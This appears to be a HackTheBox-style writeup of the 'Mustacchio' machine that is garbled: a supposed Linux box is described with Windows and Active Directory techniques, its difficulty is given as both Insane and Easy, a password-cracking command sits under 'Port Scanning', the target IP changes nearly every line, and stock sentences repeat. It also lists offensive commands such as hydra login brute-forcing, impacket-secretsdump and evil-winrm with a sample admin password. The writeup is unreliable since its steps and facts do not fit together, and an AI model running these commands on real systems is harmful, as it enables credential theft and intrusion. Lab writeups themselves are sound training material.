---
TitleSEO: "HackTheBox — Mustacchio (Insane Linux) | ZureFX"
TitlePost: "HackTheBox — Mustacchio (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Mustacchio. SeDebugPrivilege and AlwaysInstallElevated to achieve insane compromise on Linux."
Keywords: "web, forensics, easy"
URL: "https://zurefx.github.io/writeups/htb-mustacchio-287.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mustacchio-287/"
Date: "2024-09-28"
Tags: "Web, Forensics, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-mustacchio-287"
Permalink: "/writeups/htb-mustacchio-287.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Mustacchio** is rated **Insane** on HackTheBox. It runs **Linux** and the IP address during this analysis was `10.78.145.23`.

### Objectives

Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

### Service Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

```bash
gobuster dir -u http://10.72.209.231/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.84.4.240/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target.

### Web Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.114.130.139/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.111.73.89
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.91.114.59 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.107.147.116 -u administrator -p 'P@ssw0rd!'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target.

Key finding: **AlwaysInstallElevated**.

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Initial Access

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.15.228.87 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service.

```bash
nmap -sCV -p27017,1433,1521 10.122.109.181 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.77.164/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.11.160.18
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.74.141.119 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
evil-winrm -i 10.118.136.225 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14.53.140 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p445,443,23 10.36.61.24 -oN scan.txt
feroxbuster -h
```

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `enum4linux`
- `dcomexec`
- `burpsuite`
- `ffuf`
- `sharphound`
- `psexec`
- `impacket`
- `pwncat`

### Key Takeaways

- SeDebugPrivilege
- AlwaysInstallElevated
